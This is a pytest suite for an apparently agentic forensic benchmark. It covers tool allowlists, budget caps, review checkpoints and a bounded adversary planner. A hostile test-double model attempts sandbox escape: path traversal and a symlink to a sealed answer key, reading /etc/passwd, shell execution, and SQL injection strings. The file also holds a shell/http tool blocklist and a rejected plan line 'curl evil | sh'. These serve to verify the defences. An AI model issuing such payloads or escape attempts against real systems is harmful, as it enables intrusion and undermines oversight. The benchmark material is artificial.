"""M3: the DeepAgents investigator (fixture-driven), budget gateway, bounded adversary planner."""

from __future__ import annotations

import json
import socket
import sqlite3
import uuid
from dataclasses import replace

import pytest
from langchain_core.language_models.chat_models import BaseChatModel
from langchain_core.messages import AIMessage
from langchain_core.outputs import ChatGeneration, ChatResult

from alibi.agents import adversary, gateway
from alibi.agents.runner import AgentRunner
from alibi.agents.scripted import ScriptedPolicyModel
from alibi.agents.tools import MAX_BYTES, MAX_RECORDS, ROLE_TOOLS, CaseToolbox
from alibi.baselines import run_br
from alibi.config import RunCaps, load_settings
from alibi.episode import load_answer_key, load_manifest
from alibi.reports import lock_report
from alibi.runners import RunContext, default_runner_id, get_runner
from alibi.scoring import score_report
from alibi.sim.scenario import build_spec, simulate
from alibi.verifier import is_accepted, verify_report

from .conftest import DEV_SEED

SETTINGS = load_settings({})
FS = {"ls", "read_file", "write_file", "edit_file"}
FORBIDDEN = {"execute", "glob", "grep", "delete", "shell", "bash", "python", "sql", "query", "http", "fetch"}


def _ctx(paths, store, events=None, case_id="t-agent"):
    case_dir = paths.case / f"agent-{case_id}"
    events = events if events is not None else []
    return RunContext(case_id=case_id, store=store, manifest=load_manifest(paths), case_dir=case_dir,
                      settings=SETTINGS, emit=lambda t, d: events.append((t, d)))


@pytest.fixture()
def fixture_run(coverup, store_for):
    st, events = store_for(coverup), []
    runner = AgentRunner("agent-fixture", SETTINGS)
    ctx = _ctx(coverup, st, events, case_id=f"t-fixture-{uuid.uuid4().hex[:8]}")
    report = runner.run(ctx)
    return runner, ctx, report, events, st


def test_running_the_same_case_twice_does_not_investigate_twice(fixture_run):
    runner, ctx, report, events, st = fixture_run
    n = len(events)
    again = AgentRunner("agent-fixture", SETTINGS).run(ctx)
    assert [t for t, _ in events[n:] if t == "tool"] == []  # no second round of tool work
    assert {f.id for f in again.findings} == {f.id for f in report.findings}


# ----------------------------------------------------------------- end to end on the fixture policy
def test_fixture_graph_delegates_keeps_notes_and_pauses_for_review(fixture_run, coverup):
    runner, ctx, report, events, st = fixture_run
    assert report.inference_mode == "SCRIPTED_FIXTURE" and report.system_id == "ALIBI-FIXTURE"
    assert "scripted fixture" in report.system_label and "no model inference" in report.system_label
    assert report.usage.llm_calls == 0 and report.usage.tokens_in == 0 and report.usage.scripted_turns > 5
    agents = [(d["agent"], d["status"]) for t, d in events if t == "agent"]
    assert ("integrity-auditor", "started") in agents and ("integrity-auditor", "finished") in agents
    assert agents.index(("skeptic", "started")) > agents.index(("integrity-auditor", "finished"))  # skeptic runs after findings exist
    tools = [(d["agent"], d["tool"]) for t, d in events if t == "tool"]
    assert ("integrity-auditor", "check_local_vs_collector") in tools and ("skeptic", "check_transfer_sessions") in tools
    assert any(t == "todo" for t, _ in events) and any(t == "note" for t, _ in events)
    assert (ctx.case_dir / "notes" / "notes.md").read_text().startswith("# Case notes")  # exported by trusted code
    assert (ctx.case_dir / "checkpoints.sqlite").exists() and (ctx.case_dir / "transcript.json").exists()
    assert all(f.skeptic_note for f in report.findings)
    assert report.attribution.human_identity == "insufficient_evidence" and report.attribution.named_person_accused is None
    verified = verify_report(report, st, load_manifest(coverup))
    sc = score_report(lock_report(verified, "skipped_for_benchmark", by_human=False), load_answer_key(coverup), st)
    assert (sc.step_recall.num, sc.step_recall.den) == (3, 3) and sc.inference_mode == "SCRIPTED_FIXTURE"


def test_fixture_findings_equal_the_deterministic_baseline_and_never_claim_more(fixture_run, coverup):
    _, _, report, _, st = fixture_run
    br = run_br(st, load_manifest(coverup))
    key = lambda f: (f.claim_type, f.category, f.host, f.object_or_session, tuple(f.evidence_ids))  # noqa: E731
    assert sorted(map(key, report.findings)) == sorted(map(key, br.findings))


def test_review_interrupt_resumes_in_a_fresh_runner_and_cannot_rerun(fixture_run):
    runner, ctx, report, events, st = fixture_run
    con = sqlite3.connect(ctx.case_dir / "checkpoints.sqlite")
    assert con.execute("select count(*) from checkpoints where thread_id = ?", (ctx.case_id,)).fetchone()[0] > 0
    con.close()
    before = len(events)
    fresh = AgentRunner("agent-fixture", SETTINGS)  # a different object: nothing but the checkpoint carries over
    box = CaseToolbox(st, ctx.manifest, ctx.case_dir / "draft_state.json")
    assert box.finalized is False and len(box.findings) == len(report.findings)
    fresh.resume(ctx, "accept")
    assert CaseToolbox(st, ctx.manifest, ctx.case_dir / "draft_state.json").finalized is True
    tools_after = [d["tool"] for t, d in events[before:] if t == "tool"]
    assert tools_after == ["finalize_report"]  # only the approved call ran; the investigation did not run again
    again = len(events)
    fresh.resume(ctx, "accept")
    AgentRunner("agent-fixture", SETTINGS).resume(ctx, "reject")
    assert len(events) == again  # duplicate decisions are no-ops
    transcript = json.loads((ctx.case_dir / "transcript.json").read_text())
    assert "accepted the report" in transcript[-1]["content"]


def test_rejecting_keeps_the_original_proposal(coverup, store_for):
    st, events = store_for(coverup), []
    runner = AgentRunner("agent-fixture", SETTINGS)
    ctx = _ctx(coverup, st, events, case_id="t-reject")
    report = runner.run(ctx)
    runner.resume(ctx, "reject")
    box = CaseToolbox(st, ctx.manifest, ctx.case_dir / "draft_state.json")
    assert box.finalized is False and set(box.findings) == {f.id for f in report.findings}
    assert "did not accept" in json.loads((ctx.case_dir / "transcript.json").read_text())[-1]["content"]


def test_benign_control_through_the_agent_graph_alleges_nothing(make_episode, store_for):
    p = make_episode(DEV_SEED, "benign_approved_transfer")
    st = store_for(p)
    report = AgentRunner("agent-fixture", SETTINGS).run(_ctx(p, st, case_id="t-benign"))
    assert not [f for f in report.findings if f.category == "incident_allegation"]
    assert report.attribution.human_identity == "not_assessed" and report.attribution.account_used is None


# ----------------------------------------------------------------- tool audit (capabilities, not prompts)
def test_every_agent_gets_exactly_its_allowlisted_tools(fixture_run):
    runner, *_ = fixture_run
    bound = runner.bound_tools
    assert set(bound) == {"lead-investigator", "integrity-auditor", "skeptic"}
    assert set(bound["lead-investigator"]) == FS | {"task", "write_todos"} | set(ROLE_TOOLS["lead-investigator"])
    assert set(bound["integrity-auditor"]) == FS | set(ROLE_TOOLS["integrity-auditor"])
    assert set(bound["skeptic"]) == FS | set(ROLE_TOOLS["skeptic"])
    for role, names in bound.items():
        assert not (set(names) & FORBIDDEN), (role, names)
        assert not any(any(bad in n.lower() for bad in ("exec", "sql", "shell", "eval", "url")) for n in names), names
    assert "task" not in bound["integrity-auditor"] and "task" not in bound["skeptic"]  # no nested delegation
    for sub in ("integrity-auditor", "skeptic"):
        assert not (set(bound[sub]) & {"submit_finding", "submit_attribution", "finalize_report"})


def test_no_tool_accepts_sql_a_path_a_url_or_a_command(coverup, store_for):
    box = CaseToolbox(store_for(coverup), load_manifest(coverup))
    for role in ROLE_TOOLS:
        for tool in box.tools_for(role):
            params = set(tool.args)
            assert not (params & {"sql", "query", "path", "file_path", "url", "command", "cmd", "code", "regex", "pattern"}), \
                (tool.name, params)


class _Hostile(BaseChatModel):
    """Test double: a 'model' that tries to break out. It is the lead's model for one run."""

    calls: list = []

    @property
    def _llm_type(self) -> str:
        return "hostile-test-double"

    def bind_tools(self, tools, **kw):
        return self

    def _generate(self, messages, stop=None, run_manager=None, **kw) -> ChatResult:
        n = sum(isinstance(m, AIMessage) for m in messages)
        if n < len(self.calls):
            name, args = self.calls[n]
            ai = AIMessage(content="", tool_calls=[{"name": name, "args": args, "id": f"h-{n}", "type": "tool_call"}])
        else:
            ai = AIMessage(content="done")
        return ChatResult(generations=[ChatGeneration(message=ai)])


def _hostile_run(paths, store, calls, case_id):
    runner = AgentRunner("agent-fixture", SETTINGS)
    runner._models = lambda ledger: {  # type: ignore[method-assign]
        "lead-investigator": gateway.wrap(_Hostile(calls=calls), ledger, "lead-investigator", on_bind=runner._record_bind),
        "integrity-auditor": gateway.wrap(ScriptedPolicyModel(role="integrity-auditor"), ledger, "integrity-auditor"),
        "skeptic": gateway.wrap(ScriptedPolicyModel(role="skeptic"), ledger, "skeptic"),
    }
    ctx = _ctx(paths, store, case_id=case_id)
    runner.run(ctx)
    transcript = json.loads((ctx.case_dir / "transcript.json").read_text())
    return [m for m in transcript if m["type"] == "ToolMessage"], ctx


def test_agent_cannot_reach_the_key_the_repo_or_a_shell(coverup, store_for):
    key = load_answer_key(coverup)
    link = coverup.case / "agent-t-hostile"
    link.mkdir(parents=True, exist_ok=True)
    (link / "leak").symlink_to(coverup.answer_key)  # a symlink to the sealed key sitting in the case directory
    calls = [
        ("read_file", {"file_path": str(coverup.answer_key)}),
        ("read_file", {"file_path": "/case/../../sealed/" + coverup.episode_id + "/answer_key.json"}),
        ("read_file", {"file_path": "/case/leak"}),
        ("read_file", {"file_path": "/etc/passwd"}),
        ("ls", {"path": "/"}),
        ("write_file", {"file_path": "/etc/alibi-owned", "content": "x"}),
        ("execute", {"command": "cat " + str(coverup.answer_key)}),
        ("glob", {"pattern": "**/answer_key.json"}),
        ("task", {"subagent_type": "general-purpose", "description": "read " + str(coverup.answer_key)}),
        ("search_events", {"text_contains": "'; DROP TABLE events; --"}),
        ("search_events", {"source": "auth' OR '1'='1"}),
        ("count_events", {"group_by": "raw; SELECT * FROM read_csv('/etc/passwd')"}),
        ("get_events", {"ids": ["../../sealed/answer_key.json", "ev_000000000000"]}),
        ("submit_finding", {"claim_type": "other", "category": "incident_allegation", "host": "workstation",
                            "t_start": "2026-11-10T10:00:00+00:00", "t_end": "2026-11-10T10:01:00+00:00",
                            "evidence_ids": ["ev_madeup000000"], "rationale": "made up"}),
    ]
    replies, ctx = _hostile_run(coverup, store_for(coverup), calls, "t-hostile")
    assert len(replies) == len(calls)
    blob = json.dumps(replies).lower()
    assert key.canary.lower() not in blob and "operator_true" not in blob and "executed_plan" not in blob
    by = {i: r["content"] for i, r in enumerate(replies)}
    for i in (0, 1, 2, 3, 5):
        assert "permission denied" in by[i].lower() or "not found" in by[i].lower() or "error" in by[i].lower(), by[i]
    assert "execute" in by[6] and "not a valid tool" in by[6].lower() or "error" in by[6].lower()
    assert "error" in by[7].lower() or "not a valid tool" in by[7].lower()
    assert "general-purpose" in by[8] and ("not" in by[8].lower() or "error" in by[8].lower())  # no general-purpose subagent
    assert json.loads(by[9])["total_matching"] == 0 and json.loads(by[10])["total_matching"] == 0
    assert "error" in by[11].lower()
    assert json.loads(by[12])["events"] == []
    assert json.loads(by[13])["verification_status"] == "invalid_reference"
    assert not (coverup.sealed / "alibi-owned").exists()
    assert store_for(coverup).count() == load_manifest(coverup).event_count  # the evidence table is intact


def test_tool_results_are_capped_and_never_leak_the_canary(coverup, store_for):
    st = store_for(coverup)
    key = load_answer_key(coverup)
    box = CaseToolbox(st, load_manifest(coverup))
    outputs = []
    for role in ("integrity-auditor", "lead-investigator"):
        for tool in box.tools_for(role):
            args = {"get_events": {"ids": [e.id for e in st.search(limit=50)]},
                    "search_events": {"limit": 5000, "source": "collector"},
                    "count_events": {"group_by": "actor"},
                    "check_account_vs_person": {"session_id": key.attribution.session},
                    }.get(tool.name)
            if tool.name in ("submit_finding", "record_skeptic_verdict", "submit_attribution", "finalize_report"):
                continue
            outputs.append((tool.name, tool.invoke(args or {})))
    for name, out in outputs:
        assert len(out.encode()) <= MAX_BYTES + 256, (name, len(out))
        data = json.loads(out)
        assert len(data.get("events", [])) <= MAX_RECORDS
        assert key.canary not in out and "operator_true" not in out
    assert json.loads(dict(outputs)["search_events"])["returned"] <= MAX_RECORDS


# ----------------------------------------------------------------- budget gateway and offline guarantees
def test_offline_run_opens_no_network_connection_and_builds_no_live_model(coverup, store_for, monkeypatch):
    def no_net(self, addr, *a, **k):
        raise AssertionError(f"offline mode tried to connect to {addr}")

    monkeypatch.setattr(socket.socket, "connect", no_net)
    monkeypatch.setattr(socket.socket, "connect_ex", no_net)
    monkeypatch.setattr("langchain.chat_models.init_chat_model",
                        lambda *a, **k: (_ for _ in ()).throw(AssertionError("init_chat_model called offline")))
    report = AgentRunner("agent-fixture", SETTINGS).run(_ctx(coverup, store_for(coverup), case_id="t-nonet"))
    assert report.usage.llm_calls == 0 and len(report.findings) >= 3


def test_live_runner_is_refused_without_a_zero_charge_route():
    assert default_runner_id(SETTINGS) == "agent-fixture"
    with pytest.raises(gateway.RuntimeBlocked) as err:
        get_runner("agent-live", SETTINGS)
    assert "BLOCKED" in str(err.value)
    with pytest.raises(gateway.RuntimeBlocked):
        gateway.live_chat_model(SETTINGS, "anthropic:any-model")
    half = load_settings({"RUNTIME_MODE": "live", "LEAD_MODEL": "x:y", "LIVE_PROVIDER_KIND": "included_credits"})
    with pytest.raises(gateway.RuntimeBlocked):
        gateway.live_chat_model(half, "x:y")


class _Echo(BaseChatModel):
    fail: list = []
    seen: list = []

    @property
    def _llm_type(self) -> str:
        return "echo-test-double"

    def _generate(self, messages, stop=None, run_manager=None, **kw) -> ChatResult:
        self.seen.append(1)
        if self.fail:
            raise self.fail.pop(0)
        return ChatResult(generations=[ChatGeneration(message=AIMessage(
            content="ok", usage_metadata={"input_tokens": 1000, "output_tokens": 200, "total_tokens": 1200}))])


def test_ledger_enforces_shared_call_token_and_credit_caps(tmp_path):
    caps = RunCaps(max_calls=3, max_input_tokens=2500, max_output_tokens=6000, max_seconds=90)
    led = gateway.BudgetLedger(tmp_path / "b.json", caps, kind="local")
    lead, sub = gateway.wrap(_Echo(), led, "lead-investigator"), gateway.wrap(_Echo(), led, "skeptic")
    lead.invoke("a"); sub.invoke("b"); lead.invoke("c")  # noqa: E702
    with pytest.raises(gateway.BudgetExceeded):
        sub.invoke("d")  # the cap is shared across lead and specialists, not per agent
    u = led.usage()
    assert (u.llm_calls, u.tokens_in, u.tokens_out, u.cost_estimate_usd) == (3, 3000, 600, 0.0)
    assert gateway.BudgetLedger(tmp_path / "b.json", caps, kind="local").usage().llm_calls == 3  # survives a restart

    tok = gateway.BudgetLedger(None, RunCaps(max_calls=12, max_input_tokens=1500), kind="local")
    m = gateway.wrap(_Echo(), tok, "lead-investigator")
    m.invoke("a"); m.invoke("b")  # noqa: E702
    with pytest.raises(gateway.BudgetExceeded):
        m.invoke("c")

    paid = gateway.BudgetLedger(None, RunCaps(), kind="included_credits", max_usd=0.0, price_in_per_mtok=3, price_out_per_mtok=15)
    with pytest.raises(gateway.BudgetExceeded) as err:
        gateway.wrap(_Echo(), paid, "lead-investigator").invoke("a")
    assert "paid overage is not authorized" in str(err.value)
    unknown = gateway.BudgetLedger(None, RunCaps(), kind="included_credits", max_usd=5.0)
    with pytest.raises(gateway.BudgetExceeded) as err:
        gateway.wrap(_Echo(), unknown, "lead-investigator").invoke("a")
    assert "unknown pricing" in str(err.value)
    ok = gateway.BudgetLedger(None, RunCaps(), kind="included_credits", max_usd=5.0, price_in_per_mtok=3, price_out_per_mtok=15)
    gateway.wrap(_Echo(), ok, "lead-investigator").invoke("a")
    assert ok.usage().cost_estimate_usd == pytest.approx((1000 * 3 + 200 * 15) / 1e6)


def test_gateway_retries_once_and_disables_the_route_on_credential_errors():
    led = gateway.BudgetLedger(None, RunCaps(), kind="local")
    flaky = _Echo(fail=[TimeoutError("request timed out")], seen=[])
    m = gateway.wrap(flaky, led, "lead-investigator")
    m.retry_sleep_s = 0
    assert m.invoke("a").content == "ok" and len(flaky.seen) == 2
    assert (led.usage().llm_calls, led.usage().errors, led.usage().retries) == (2, 1, 1)  # the failed call is counted

    led2 = gateway.BudgetLedger(None, RunCaps(), kind="local")
    twice = _Echo(fail=[TimeoutError("timed out"), TimeoutError("timed out")], seen=[])
    m2 = gateway.wrap(twice, led2, "lead-investigator")
    m2.retry_sleep_s = 0
    with pytest.raises(TimeoutError):
        m2.invoke("a")
    assert len(twice.seen) == 2  # exactly one retry, never unbounded

    led3 = gateway.BudgetLedger(None, RunCaps(), kind="local")
    denied = _Echo(fail=[PermissionError("401 authentication failed: credit balance too low")], seen=[])
    m3 = gateway.wrap(denied, led3, "lead-investigator")
    with pytest.raises(PermissionError):
        m3.invoke("a")
    with pytest.raises(gateway.BudgetExceeded) as err:
        m3.invoke("b")
    assert "route disabled" in str(err.value) and len(denied.seen) == 1


def test_budget_stop_yields_a_censored_partial_report_not_a_crash(coverup, store_for):
    tight = replace(SETTINGS, caps=RunCaps())
    runner = AgentRunner("agent-fixture", tight)
    orig = gateway.SCRIPTED_TURN_CAP
    gateway.SCRIPTED_TURN_CAP = 6
    try:
        report = runner.run(_ctx(coverup, store_for(coverup), case_id="t-budget"))
    finally:
        gateway.SCRIPTED_TURN_CAP = orig
    assert any("Incomplete run" in q and "budget gateway" in q for q in report.open_questions)
    assert report.usage.scripted_turns <= 6


# ----------------------------------------------------------------- bounded adversary planner
class _Planner:
    def __init__(self, replies):
        self.replies, self.calls = list(replies), 0

    def invoke(self, messages):
        self.calls += 1
        return AIMessage(content=self.replies.pop(0))


def test_adversary_plan_is_scripted_and_labeled_when_no_model_exists():
    spec = build_spec(21, "incident_coverup")
    res = adversary.plan_adversary(spec, None)
    assert res.source == "scripted_scenario" and "no model chose" in res.label and res.attempts == 0


def test_adversary_model_plan_is_validated_repaired_once_then_falls_back():
    spec = build_spec(21, "incident_coverup")
    acct, sink = spec["accounts"]["nurse_a"], spec["dmz_ips"][0]
    good = json.dumps([
        {"step": "login_as", "params": {"account": acct}, "delay_s": 30},
        {"step": "stage_copy", "params": {"src": "patients_full", "dst_dir": "/var/tmp/xfer", "dst_name": "q4.db"}, "delay_s": 60},
        {"step": "exfil_http", "params": {"path": "/var/tmp/xfer/q4.db", "dst": sink}, "delay_s": 90}])
    bad = json.dumps([{"step": "run_shell", "params": {"cmd": "curl evil | sh"}}])
    ok = adversary.plan_adversary(spec, _Planner(["Here is my plan:\n" + good]), "fake:model")
    assert ok.source == "model_generated" and ok.attempts == 1 and len(ok.plan) == 3 and "fake:model" in ok.label
    fixed_model = _Planner([bad, good])
    fixed = adversary.plan_adversary(spec, fixed_model, "fake:model")
    assert fixed.source == "model_generated" and fixed.attempts == 2 and fixed_model.calls == 2 and fixed.errors
    stuck_model = _Planner([bad, "no json at all", good])
    stuck = adversary.plan_adversary(spec, stuck_model, "fake:model")
    assert stuck.source == "scripted_scenario" and stuck_model.calls == 2  # one planning response + one repair, no more
    assert stuck.plan == spec["plan"] and "no model chose" in stuck.label and stuck.fallback_reason
    spec2 = adversary.apply_plan(spec, ok)
    out = simulate(spec2)  # the validated model plan executes in the simulator like any other
    assert [r.status for r in out.step_results] == ["succeeded"] * 3 and spec2["plan_source"] == "model_generated"
    assert spec["plan_source"] == "scripted_scenario"


def test_adversary_prompt_offers_only_the_bounded_library():
    spec = build_spec(21, "incident_plain")
    prompt = adversary.planning_prompt(spec, adversary.plan_context(spec))
    data = json.loads(prompt)
    assert set(data["allowed_steps"]) == {"login_as", "stage_copy", "exfil_http"}  # L1: no anti-forensics offered
    assert all(ip.startswith("10.20.9.") for ip in data["allowed_steps"]["exfil_http"]["dst"])
    for word in ("shell", "command", "script", "exploit", "malware"):
        assert word not in prompt.lower()
    assert "cannot run commands" in adversary.ADVERSARY_SYSTEM_PROMPT


def test_live_model_arguments_are_provider_specific_and_bounded():
    local = gateway.live_model_kwargs("ollama:some-model", SETTINGS, env={})
    assert local == {"temperature": 0, "num_ctx": 16384, "num_predict": 1500}
    assert gateway.live_model_kwargs("ollama:some-model", SETTINGS, env={"LLM_NUM_CTX": "32768"})["num_ctx"] == 32768
    other = gateway.live_model_kwargs("anthropic:some-model", SETTINGS, env={})
    assert other["max_retries"] == 0 and other["max_tokens"] <= SETTINGS.caps.max_output_tokens and other["timeout"] <= 60
